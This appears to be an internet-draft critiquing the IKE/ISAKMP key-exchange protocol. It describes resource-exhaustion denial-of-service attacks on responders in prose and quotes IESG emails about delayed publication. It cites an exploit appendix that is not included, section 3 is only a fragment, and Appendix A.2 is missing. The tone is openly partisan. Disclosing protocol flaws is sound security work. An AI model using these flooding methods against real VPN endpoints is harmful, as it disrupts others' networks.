Abstract

   IKE [RFC-2409] is a session-key exchange mechanism within the ISAKMP
   [RFC-2408] protocol framework.  This combination is fraught with
   egregious fundamental design flaws.

   This document details a few of the more easily exploitable problems;
   including interoperability issues, privacy information leaking, and
   severe denial of service attacks.

   The author was prevented from publishing this information in the
   IETF, while awaiting publication of the more capable and robust
   Photuris specification [RFC-2522].

1.  Introduction

   Since December 1995, a number of internet-drafts related to Internet
   Protocol Security have been awaiting official publication as Requests
   For Comments.  The Internet Engineering Steering Group (IESG) made
   the unprecedented decision to delay publication of other work in any
   form, until the chartered Working Group had completed the next
   revision of their documents.  Usually, Experimental work is published
   prior to a Proposed Standard.  This internal IESG decision was not
   officially announced until after a formal appeal of the years of
   interminable delay.  See Appendix A.1.

   Unfortunately, any delay of the Working Group documents meant that
   publication of the other work would be delayed as well.  This had the
   effect of stifling overt criticism of the documents, despite their
   obvious faults.

   Eventually, in November 1998, the revised IP Security documents were
   published.  It took several more months before publication of other
   specifications was permitted, and not all of them have been
   permitted.  See Appendix A.2 and A.3.

   In the meantime, vast sums of money have been wasted implementing and
   testing the overly complicated and poorly specified IKE/ISAKMP.

   This document details a few of the more easily exploitable problems;
   including egregious fundamental design flaws, interoperability
   issues, privacy information leaking, and severe denial of service
   attacks.

   It is hoped that this draft will stimulate discussion.

2.  Cookies

   While Karn and Simpson are credited (see [RFC-2408 page 12]) with the
   cookie (anti-clogging token) concept taken from Photuris, the
   IKE/ISAKMP version of cookies fails to meet the explicit requirements
   set forth in Photuris:

      "The computing resources themselves must also be protected against
      malicious attack or sabotage....  Because of their use of CPU-
      intensive operations, such as modular exponentiation, key
      management schemes based on public-key cryptography are vulnerable
      to resource clogging attacks....  These attacks are mitigated
      through using time-variant cookies, and the elimination of
      receiver state during initial exchanges of the protocol."
      [Photuris-01 pages 2-3]

      "It MUST NOT be possible for anyone other than the issuing entity
      to generate cookies that will be accepted by that entity.  This
      implies that the issuing entity will use local secret information
      in the generation and subsequent verification of a cookie."
      [RFC-2522 page 19] also [Photuris-01 page 12]

      "The Responder secret value that affects its cookies MAY remain
      the same for many different Initiators.  However, this secret
      SHOULD be changed periodically to limit the time for use of its
      cookies (typically each 60 seconds)."  [RFC-2522 page 20]

      "The Responder remains stateless until a shared-secret has been
      created."  [RFC-2522 page 3]

      "Otherwise, the Responder returns a Cookie_Response.  Note that
      the Responder creates no additional state at this time."
      [RFC-2522 page 15] also [Photuris-01 page 12]

      "The [Responder] cookie is not cached per Initiator to avoid
      saving state during the initial Cookie Exchange."  [RFC-2522 page
      20]

2.1.  Cookie Crumb Attack

   Unfortunately, ISAKMP replaces the time-variant secret of Photuris
   with a date and time stamp [RFC-2408 page 20], requires state in the
   Responder, and leaves a "cookie crumb" for every connection attempt.

   The problem is acknowledged, and inadequate hand-waving is
   recommended:

      "... the anticlogging [sic] mechanism should be used in conjuction
      [sic] with a garbage-state collection mechanism; an attacker can
      still flood a server using packets with bogus IP addresses and
      cause state to be created."  [RFC-2408 page 13].

   This text demonstrates utter failure to understand the fundamental
   purpose of the Photuris anti-clogging mechanism design, despite
   several repetitions in the Photuris specification: preventing the
   creation of state during a flooding attack.

   All tests have shown that garbage collection is not sufficient.  One
   common implementation used over 50MB of memory during a 1 minute
   test.  Moreover, a simple flooding program can consume 100% of the
   CPU, degrading performance to the extent that outgoing packets stop
   entirely.  See Appendix B "Cookie Crumbs (Exploit)".

   Moreover, the problem is not limited to "bogus IP addresses".  Valid
   IP addresses cause the same symptoms.

   Surprisingly, all variants of the exploit proved successful:

      single source address, single source port
      single source address, random source port
      random source address, single source port
      random source address, random source port

   This fundamental design flaw is endemic, and appears to be
   irremediable.

2.2.  Cookie Jar Attack

   Another significant problem is the lack of any resource limitation
   feature, such as is found in Photuris.  In particular, an attacker
   can send a large number of ISAKMP proposals, collect the responses in
   a "cookie jar", then send a large number of key exchange messages all
   at once.

   The Responder is swamped by simultaneously calculating the shared-
   secrets and decrypting the nonces.  Both operations are
   computationally expensive.

   Note that the attacker does not need to make any computations itself.
   The key exchange and nonce payloads can be properly formatted
   garbage.

   This attack is especially effective for an evesdropper in the path
   between a legitimate Initiator and Responder.  The evesdropper can
   simulate an entire valid range of source addresses, making detection
   and avoidance of this attack very difficult.

   This fundamental design flaw is inherent in the specification, and
   remediation will require significant protocol changes.


2.3.  Cookie Race Attack

   A more subtle flaw is a race condition between the phases after the
   initial exchange of cookies.

   An evesdropper on a path between the parties can observe a valid
   ISAKMP proposal header from the Responder, add appropriate message
   fields with garbage contents, and send the bogus message to the
   Responder, before the next correct message arrives from the
   Initiator.

   The Responder will waste significant time calculating a shared-
   secret, and will not discover the substitution until later
   verification fails.

   The Initiator will never discover the substitution, as there is no
   requirement that the Responder send any message to signal
   verification failures.  The Initiator will futilely retransmit.

   This is a mere specification error, but affects interoperability.


3.  Aggressive Denial of Service

   be detailed.


A.  Responses to Appeals
A.1.  Publication Delayed

   Date: Fri, 25 Jul 1997 19:16:25 -0700
   To: "William Allen Simpson" <wsimpson@greendragon.com>
   From: Fred Baker <fred@cisco.com>
   Subject: Response to Appeal
   Cc: ietf@ietf.org

   This is to formally respond to your appeal to and question of the chair,
   regarding the delayed publication of the two internet drafts as
   Experimental RFCs:

           "ICMP Security Failures Messages", 04/30/1996,
              <draft-simpson-icmp-ipsec-fail-02.txt>
   and
           "Internet Security Transform Enhancements", 04/30/1997,
              <draft-simpson-ipsec-enhancement-01.txt>

   The sense of the IESG, and apparently your sense in naming them, is that
   both of these documents relate directly to and overlap with work being done
   in the IPSEC Working Group. In the IETF Plenary session in San Jose, and in
   various emails, the Security Area Director has stated that, regardless of
   the intended status of the draft, drafts that are closely related to the
   work currently being done in the IPSEC Working Group will not be published
   until the principal output of that working group has been published. This
   policy was propounded because some factions in that working group were
   telling potential customers that their approach was in fact the IETF
   approach, and the IESG felt that giving them an RFC number to quote would
   give them additional ammunition with which to confuse the marketplace.
   Note that, while the policy is the Security Area Director's, it was
   propounded with the explicit concurrence of the IESG.

   You also point out in your appeal that the POISED documents indicate that a
   document which fails to achieve Proposed Standard status may still be
   published as Experimental, and view our delay as violating this guidance. I
   believe you are mistaken; while POISED permits such a publication, POISED
   does not require it to be done on any given timetable, and does not
   preclude the IESG from an action such as it has taken in this case. The
   delay in publication of your documents (and others) has not precluded
   people from using the documents, only from marketing them to the ignorant
   as RFCs and therefore standards.

   Yes, I will agree - hastily - that anyone who is informed will know that
   RFCs are archival documents, and not automatically standards. However, you
   know as well as I that this fact is frequently lost in the translation from
   engineering to marketing, and in this case the marketing issue has been a
   serious factor.

   I am sorry that this delay has upset you. The IESG is not pleased with the
   progress of the IPSEC Working Group, which has been a difficult environment
   for everyone involved in it. We hope that the new chairs will be able to
   bring this work to closure and move the working group on to more productive
   efforts.

A.3.  Publication Refused

   From: Steve Coya <scoya@ietf.org>
   Reply-To: Steve Coya <scoya@ietf.org>
   To: RFC Editor <rfc-ed@ISI.EDU>
   cc: iesg@ietf.org, wsimpson@greendragon.com
   Subject: Re: draft-simpson-ipsec-enhancement-01.txt to Experimental

   Greetings,

   The IESG consensus requests that Internet Security Transform Enhancements
   <draft-simpson-ipsec-enhancement-01.txt> NOT be published as an
   Experimental RFC as this document adds sequence numbers to the old
   and obsolete AH and ESP transforms.  In the case of ESP, it does so in an
   incompatible way. Publication of these documents could easily confuse
   implementors of IPSEC.

   The IESG will reconsider publication if this document is updated as needed
   and resubmitted.
